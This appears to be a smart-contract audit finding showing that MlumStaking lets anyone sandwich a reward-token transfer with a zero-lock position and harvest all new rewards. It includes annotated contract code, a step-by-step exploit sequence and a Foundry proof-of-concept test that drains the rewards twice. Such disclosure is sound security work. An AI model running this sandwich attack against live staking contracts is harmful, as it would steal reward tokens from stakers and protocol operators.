# MlumStaking user can frontrun new reward tokens and harvest immediatelly

## Summary

All new rewards can be stolen by sandwiching rewards with 0 `lockDuration`.

## Vulnerability Detail

The way that users in `MlumStaking` receive rewards is first there should be some reward token transferred to the contract and the next caller will trigger `_updatePool` function, which will increase the `_accRewardsPerShare` based on the amount that has been sent and then divided by all the positions in the system.

```solidity
function _updatePool() internal {
        uint256 accRewardsPerShare = _accRewardsPerShare;
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        uint256 lastRewardBalance = _lastRewardBalance;

        // recompute accRewardsPerShare if not up to date
        if (lastRewardBalance == rewardBalance || _stakedSupply == 0) {
            return;
        }

        uint256 accruedReward = rewardBalance - lastRewardBalance;
        _accRewardsPerShare = accRewardsPerShare + ((accruedReward * (PRECISION_FACTOR)) / (_stakedSupplyWithMultiplier));

        _lastRewardBalance = rewardBalance;

        emit PoolUpdated(_currentBlockTimestamp(), accRewardsPerShare);
    }
```

The problem is that this `rewardToken` transfer can be sandwiched by anyone to harvest immediate rewards. It will happen since there is no minimum `lockDuration` and positions opened with 0 can be closed right after.

Impact is max when there is sequence of the following actions (note that due to the nature of IotaEVM, deployers will be forced to not submit 2 consecutive transactions for deploy and transferring reward tokens, since it can either fail or send the tokens to wrong address, depending on which transaction will be processed first, this gives the needed time for Alice to insert her tx between the 2):

1. 10e18 `rewardTokens` are sent, when there are no positions in the contract
2. Alice frontrun step 1 by `createPosition` with 1 wei and 0 `lockDuration`

Important variables:

- Alice’s `rewardDebt` = 0
- Alice’s `amountWithMultiplier` = 1
- `_stakedSupplyWithMultiplier` = 1
- `_accRewardsPerShare` = 0
1. Alice call `withdrawFromPosition` with 1 wei, and pool is updated:

```solidity
function _updatePool() internal {
        uint256 accRewardsPerShare = _accRewardsPerShare;
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        uint256 lastRewardBalance = _lastRewardBalance;

        // recompute accRewardsPerShare if not up to date
        if (lastRewardBalance == rewardBalance || _stakedSupply == 0) {
            return;
        }

        uint256 accruedReward = rewardBalance - lastRewardBalance;// 10e18
		    //@audit 0 + (10e18 * 1e12) / 1 = 10e30
        _accRewardsPerShare = accRewardsPerShare + ((accruedReward * (PRECISION_FACTOR)) / (_stakedSupplyWithMultiplier));

        _lastRewardBalance = rewardBalance;//10e18

        emit PoolUpdated(_currentBlockTimestamp(), accRewardsPerShare);
    }
```

1. In `_harvestPosition` the entire `rewardToken` balance is sent to Alice:

```solidity
function _harvestPosition(uint256 tokenId, address to) internal {
        StakingPosition storage position = _stakingPositions[tokenId];

        // compute position's pending rewards
        //@audit 1 * 10e30 / 10e12 - 0 = 10e18
        uint256 pending = position.amountWithMultiplier * _accRewardsPerShare / PRECISION_FACTOR - position.rewardDebt;

        // transfer rewards
        if (pending > 0) {
            // send rewards
            _safeRewardTransfer(to, pending);
        }
        emit HarvestPosition(tokenId, to, pending);
    }
```

1. All new `rewardToken` transfer can be immediately stolen.

Here is a POC demonstrating how Alice takes the entire balance of `rewardToken` **twice**. It can be placed in `MlumStaking.t.sol`:

```solidity
function testC1() public {
    _stakingToken.mint(ALICE, 10 ether);

    vm.startPrank(ALICE);
    _stakingToken.approve(address(_pool), 1 ether);
    _pool.createPosition(1 ether, 0);
    vm.stopPrank();

    IMlumStaking.StakingPosition memory pos = _pool.getStakingPosition(1);

    console.log("Rewards after create", _pool.pendingRewards(1));
    console.log("Rewards balance after create", _rewardToken.balanceOf(ALICE));
    console.log(pos.amountWithMultiplier);
    console.log(pos.rewardDebt);
    console.log(_pool._accRewardsPerShare());
    

    _rewardToken.mint(address(_pool), 100000e6);
    console.log("Rewards balance in staking", _rewardToken.balanceOf(address(_pool)));

    vm.prank(ALICE);
    _pool.withdrawFromPosition(1, 1 ether);

    console.log("Rewards balance after withdraw", _rewardToken.balanceOf(ALICE));
    console.log("RRewards balance in staking after", _rewardToken.balanceOf(address(_pool)));
    console.log(_pool._accRewardsPerShare());
    // =======================
    vm.startPrank(ALICE);
    _stakingToken.approve(address(_pool), 1 ether);
    _pool.createPosition(1 ether, 0);
    vm.stopPrank();
    console.log(_pool._accRewardsPerShare());

    _rewardToken.mint(address(_pool), 200e6);
    console.log("Rewards balance in staking", _rewardToken.balanceOf(address(_pool)));

    vm.prank(ALICE);
    _pool.withdrawFromPosition(2, 1 ether);
    console.log("Rewards balance after withdraw", _rewardToken.balanceOf(ALICE));
    console.log("RRewards balance in staking after", _rewardToken.balanceOf(address(_pool)));
    console.log(_pool._accRewardsPerShare());

}
```

Another possible scenario is when there are already some positions, everyone can sandwich the transferring of `rewardToken`, creating positions with 0 `lockDuration` and any satisfying amount of `stakedToken`, then backrun the transfer by withdraw and close the position taking the difference of previous `_accRewardsPerShare` and next one updated in `_updatePool`. This way no one will be incentivized to lock his tokens for any amount of time, when he can simply harvest the position immediately.

It order of events will look like that → `MlumStaking::createPosition` → `rewardToken::transfer(MlumStaking, 1000e18)` → `MlumStaking::withdrawFromPosition`.

## Impact

All the `rewardTokens` can be stolen from the first staker in `MlumStaking`
